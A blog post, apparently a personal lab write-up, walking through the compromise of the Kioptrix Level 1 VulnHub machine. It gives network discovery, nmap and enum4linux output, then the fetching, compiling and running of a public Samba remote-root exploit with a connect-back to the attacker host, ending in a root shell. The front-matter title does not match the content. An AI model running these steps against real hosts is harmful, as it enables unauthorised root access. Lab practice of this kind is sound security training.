---
title: "Markdown Extra Components"
layout: post
date: 2016-02-24 22:48
image: /assets/images/markdown.jpg
headerImage: false
tag:
- Writeup
- Pentest
category: blog
author: marioibarra
description: Kioptrix lvl 1 Writeup
---

## Kioptrix
                    
First let's begin with information gathering. We need to find which IP the kioptrix box has. I'm using a host only network with an IP of 192.168.8.0/24.
<figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span style="color:black"><span style="color:red">root@kali</span>:~# netdiscover -r 192.168.8.0/24


 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 5 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 300               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.8.1   00:50:56:c0:00:01      2     120  Unknown vendor              
 192.168.8.140 00:0c:29:69:72:b0      2     120  Unknown vendor              
 192.168.8.254 00:50:56:e8:60:ea      1      60  Unknown vendor
</span></code></pre></figure>

The IP for the Kioptrix machine is 192.168.8.140. I'm using the tools <a href="https://github.com/codingo/reconnoitre">reconnoitre</a> and <a href="https://github.com/xapax/oscp">reconscan.py</a> to automate nmap scans, nitko, dirb, and enum4linux.
<figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span class="gp"><span style="color:red">root@kali</span>:~#./reconnoitre.py -t 192.168.8.140 -o /root/Vulnhub --services

# Nmap 7.40 scan initiated Thu Jun 29 02:34:23 2017 as: nmap -vv -Pn -sS -A -sC -p- -T 3 -script-args=unsafe=1 -n -oN /root/Vulnhub/192.168.8.140/scans/192.168.8.140.nmap -oX /root/Vulnhub/192.168.8.140/scans/192.168.8.140_nmap_scan_import.xml 192.168.8.140
Nmap scan report for 192.168.8.140
Host is up, received arp-response (0.00025s latency).
Scanned at 2017-06-29 02:34:23 PDT for 107s
Not shown: 65529 closed ports
Reason: 65529 resets
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
| 1024 35 109482092953601530927446985143812377560925655194254170270380314520841776849335628258408994190413716152105684423280369467219093526740118507720167655934779634416983599247086840099503203800281526143567271862466057363705861760702664279290804439502645034586412570490614431533437479630834594344497670338190191879537
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKtycvxuV/e7s2cN74HyTZXHXiBrwyiZe/PKT/inuT5NDSQTPsGiyJZU4gefPAsYKSw5wLe28TDlZWHAdXpNdwyn4QrFQBjwFR+8WbFiAZBoWlSfQPR2RQW8i32Y2P2V79p4mu742HtWBz0hTjkd9qL5j8KCUPDfY9hzDuViWy7PAAAAFQCY9bvq+5rs1OpY5/DGsGx0k6CqGwAAAIBVpBtIHbhvoQdN0WPe8d6OzTTFvdNRa8pWKzV1Hpw+e3qsC4LYHAy1NoeaqK8uJP9203MEkxrd2OoBJKn/8EXlKAco7vC1dr/QWae+NEkI1a38x0Ml545vHAGFaVUWkffHekjhR476Uq4N4qeLfFp5B+v+9flLxYVYsY/ymJKpNgAAAIEApyjrqjgX0AE4fSBFntGFWM3j5M3lc5jw/0qufXlHJu8sZG0FRf9wTI6HlJHHsIKHA7FZ33vGLq3TRmvZucJZ0l55fV2ASS9uvQRE+c8P6w72YCzgJN7v4hYXxnY4RiWvINjW/F6ApQEUJc742i6Fn54FEYAIy5goatGFMwpVq3Q=
|   1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAvv8UUWsrO7+VCG/rTWY72jElft4WXfXGWybh141E8XnWxMCu+R1qdocxhh+4Clz8wO9beuZzG1rjlAD+XHiR3j2P+sw6UODeyBkuP24a+7V8P5nu9ksKD1fA83RyelgSgRJNQgPfFU3gngNno1yN6ossqkcMQTI1CY5nF6iYePs=
|_sshv1: Server supports SSHv1
80/tcp   open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2017-06-29T09:36:29+00:00; +1m48s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
1024/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
MAC Address: 00:0C:29:6C:8E:27 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
TCP/IP fingerprint:
OS:SCAN(V=7.40%E=4%D=6/29%OT=22%CT=1%CU=35379%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=5954CA0B%P=x86_64-pc-linux-gnu)SEQ(SP=C6%GCD=1%ISR=CF%TI=Z%CI=Z%II=I%T
OS:S=7)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11NW0%O5=
OS:M5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=1
OS:6A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11
OS:NW0%RD=0%Q=)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FF
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)

Uptime guess: 0.024 days (since Thu Jun 29 02:01:09 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=198 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: mean: 1m47s, deviation: 0s, median: 1m47s
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|   MYGROUP<1e>          Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 57564/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32125/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25278/udp): CLEAN (Failed to receive data)
|   Check 4 (port 26295/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.8.140

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 29 02:36:11 2017 -- 1 IP address (1 host up) scanned in 107.87 seconds
</span></code></pre></figure>
    
                    <p>Port 80 was open, but I did not find anything interesting on there.  I moved on to enumerate port 139 with enum4linux and I was able to find the service version for samba.</p>

                    <figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span class="gp"><span class="r">root@kali</span>:~/oscp# 
 ======================================= 
|    OS information on 192.168.8.140    |
 ======================================= 
[+] Got OS info for 192.168.8.140 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
[+] Got OS info for 192.168.8.140 from srvinfo:
    KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
    platform_id     :   500
    os version      :   4.5
    server type     :   0x9a03

</span></code></pre></figure>
                    
                    <p>I checked searchsploit for Samba exploits and found one.  I copied it to /root, compiled and executed it.  It worked and resulted in a root shell.</p>

                    <figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span class="gp"><span class="r">root@kali</span>:~# searchsploit -m 10
Exploit: Samba 2.2.8 - Remote Code Execution
    URL: https://www.exploit-db.com/exploits/10/
   Path: /usr/share/exploitdb/platforms/linux/remote/10.c

Copied to '/root/'

<span class="r">root@kali</span>:~# gcc -o samba 10.c
<span class="r">root@kali</span>:~# chmod 755 samba
<span class="r">root@kali</span>:~# ./samba -b 0 -c 192.168.8.141 192.168.8.140
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
ls
whoami
root

</span></code></pre></figure>


